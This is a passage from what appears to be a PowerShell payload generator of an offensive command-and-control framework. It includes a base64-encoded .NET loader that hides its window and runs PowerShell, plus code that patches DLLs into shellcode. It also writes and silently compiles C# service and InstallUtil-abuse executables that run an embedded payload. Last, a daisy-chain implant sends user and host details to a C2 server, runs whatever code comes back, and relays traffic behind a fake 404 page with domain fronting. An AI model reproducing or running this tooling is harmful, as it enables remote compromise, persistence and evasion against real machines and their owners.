Qgt3t4UEQcU/gETCBEILQgRB28SAAAKANwAEQRvEwAACm8UAAAKEwYrABEGKgAAAAEQAAACAEcAJm0AFAAAAAAbMAIASgAAAAIAABEAKAEAAAYKBhYoAgAABiYAKBUAAAoCKBYAAApvFwAACgsHKAQAAAYmAN4dJgAoFQAACgIoFgAACm8XAAAKCwcoBAAABiYA3gAAKgAAARAAAAAADwAcKwAdAQAAARMwAgAQAAAAAwAAEQAoAQAABgoGFigCAAAGJipCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAABgAgAAI34AAMwCAAAwAwAAI1N0cmluZ3MAAAAA/AUAAAgAAAAjVVMABAYAABAAAAAjR1VJRAAAABQGAADsAAAAI0Jsb2IAAAAAAAAAAgAAAVcdAhwJAAAAAPoBMwAWAAABAAAAEgAAAAIAAAACAAAABgAAAAQAAAAXAAAAAgAAAAIAAAADAAAAAgAAAAIAAAACAAAAAQAAAAIAAAAAAAoAAQAAAAAABgArACQABgCyAJIABgDSAJIABgAUAfUACgCDAVwBCgCTAVwBCgCwAT8BCgC/AVwBCgDXAVwBBgAfAgACCgAsAj8BBgBOAkICBgB3AlwCBgC5AqYCBgDOAiQABgDrAiQABgD3AkICBgAMAyQAAAAAAAEAAAAAAAEAAQABABAAEwAAAAUAAQABAFaAMgAKAFaAOgAKAAAAAACAAJEgQgAXAAEAAAAAAIAAkSBTABsAAQBQIAAAAACGGF4AIQADAFwgAAAAAJYAZAAlAAMAECEAAAAAlgB1ACoABAB4IQAAAACWAHsALwAFAAAAAQCAAAAAAgCFAAAAAQCOAAAAAQCOABEAXgAzABkAXgAhACEAXgA4AAkAXgAhACkAnAFGADEAqwEhADkAXgBLADEAyAFRAEEA6QFWAEkA9gE4AEEANQJbADEAPAIhAGEAXgAhAAwAhQJrABQAkwJ7AGEAnwKAAHEAxQKGAHkA2gIhAAkA4gKKAIEA8gKKAIkAAAOpAJEAFAOuAIkAJQO0AAgABAANAAgACAASAC4ACwDDAC4AEwDMAI4AugC/ACcBNAFkAHQAAAEDAEIAAQAAAQUAUwACAASAAAAAAAAAAAAAAAAAAAAAAPAAAAACAAAAAAAAAAAAAAABABsAAAAAAAEAAAAAAAAAAAAAAD0APwEAAAAAAAAAAAA8TW9kdWxlPgBwb3NoLmV4ZQBQcm9ncmFtAG1zY29ybGliAFN5c3RlbQBPYmplY3QAU1dfSElERQBTV19TSE9XAEdldENvbnNvbGVXaW5kb3cAU2hvd1dpbmRvdwAuY3RvcgBJbnZva2VBdXRvbWF0aW9uAFJ1blBTAE1haW4AaFduZABuQ21kU2hvdwBjbWQAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHBvc2gAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAdXNlcjMyLmRsbABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFJ1bnNwYWNlSW52b2tlAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09iamVjdABJbnZva2UAQ2xvc2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYXRvcgBNb3ZlTmV4dABJRGlzcG9zYWJsZQBEaXNwb3NlAFRvU3RyaW5nAFN0cmluZwBUcmltAEVuY29kaW5nAGdldF9Vbmljb2RlAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAAAADIAAAAAAAEia8UX96xUKNIcRtUFz57wAIt3pcVhk04IkCBggEAAAAAAQFAAAAAwAAGAUAAgIYCAMgAAEEAAEODgQAAQEOA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"

    $payloadraw = [Convert]::ToBase64String($bytes)
    $RawBytes = [System.Convert]::FromBase64String($86)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x86'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x86.dll", $dllBytes)
    Write-Host -Object "x86 DLL Written to: $FolderPath\payloads\proxypayload_x86.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x86.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x86.bin", $shellcodeBytes)
    Write-Host -Object "x86 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x86.bin"  -ForegroundColor Green

    $RawBytes = [System.Convert]::FromBase64String($64)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x64'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x64.dll", $dllBytes)
    Write-Host -Object "x64 DLL Written to: $FolderPath\payloads\proxypayload_x64.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x64.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x64.bin", $shellcodeBytes)
    Write-Host -Object "x64 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x64.bin"  -ForegroundColor Green


    $praw = [Convert]::ToBase64String($bytes)
    $cscservicecode = 'using System;
    using System.Text;
    using System.ServiceProcess;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;


    namespace Service
    {
        static class Program
        {
            static void Main()
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Service1()
                };
                ServiceBase.Run(ServicesToRun);
            }
        }
        public partial class Service1 : ServiceBase
        {
            public static string InvokeAutomation(string cmd)
            {
                Runspace newrunspace = RunspaceFactory.CreateRunspace();
                newrunspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
                Pipeline pipeline = newrunspace.CreatePipeline();

                pipeline.Commands.AddScript(cmd);
                Collection<PSObject> results = pipeline.Invoke();
                newrunspace.Close();

                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
                return stringBuilder.ToString().Trim();
            }

            protected override void OnStart(string[] args)
            {
                try
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
                catch (ArgumentException e)
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
            }

            protected override void OnStop()
            {
            }
        }
    }'
    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy-service.cs", $cscservicecode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy-service.exe"  -ForegroundColor Green


    $csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'

    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy.cs", $csccode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy.exe"  -ForegroundColor Green

    }
function Invoke-DaisyChain {
param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)

$daisycommand = '$serverhost="'+$daisyserver+'"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$serverport='+$port+'
$server=$serverhost+":"+$serverport
function Get-Webclient ($Cookie) {
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
} $wc }
function primer {
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'


$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie)
{
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = '/connect',"/images/static/content/","/news/","/webapp/static/","/images/prints/","/wordpress/site/","/steam","/true/images/77/","/holidngs/images/","/daisy"
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://+:`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    `$message = `$null
    `$context = `$listener.GetContext() # blocks until request is received
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
    {  
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
